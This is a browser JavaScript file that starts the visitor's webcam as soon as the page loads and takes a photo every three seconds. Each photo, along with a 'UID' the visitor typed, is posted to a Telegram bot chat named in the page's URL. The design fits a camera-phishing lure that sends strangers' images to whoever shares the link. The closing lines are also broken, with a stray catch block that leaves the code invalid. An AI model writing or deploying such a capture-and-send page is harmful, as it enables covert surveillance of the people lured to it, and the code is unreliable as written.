import { BOT_TOKEN } from "./config.js";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");
const uidInput = document.getElementById("uid");

const params = new URLSearchParams(window.location.search);
const chatId = params.get("id");

let stream = null;
let captureInterval = null;

// Toast message
function showToast(msg){
  toast.innerText = msg;
  toast.style.opacity=1;
  setTimeout(()=>{toast.style.opacity=0},3000);
}

// Capture & send function
async function captureAndSend(){
  if(!stream) return;
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0);

  canvas.toBlob(async (blob)=>{
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob);
    formData.append("caption", `UID: ${uidInput.value || "No UID"}`);
    try{
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
        method:"POST",
        body:formData
      });
      const data = await res.json();
      if(data.ok) showToast("Photo sent ✅");
      else showToast("Send failed ❌");
    }catch(err){
      console.error(err);
      showToast("Error ❌");
    }
  },"image/jpeg");
}

// Start camera and auto capture
async function startCamera(){
  try{
    stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;
    video.play();
    // Every 3 seconds capture
    captureInterval = setInterval(captureAndSend,3000);
  }catch(e){
    showToast("Permission denied ❌");
    console.error(e);
  }
}

// Start on page load
window.onload = () => startCamera();

// Stop on page unload
window.onbeforeunload = () => {
  if(stream) stream.getTracks().forEach(track=>track.stop());
  if(captureInterval) clearInterval(captureInterval);
};
  }catch(e){
    console.error(e);
    showToast("Permission denied ❌");
  }
};
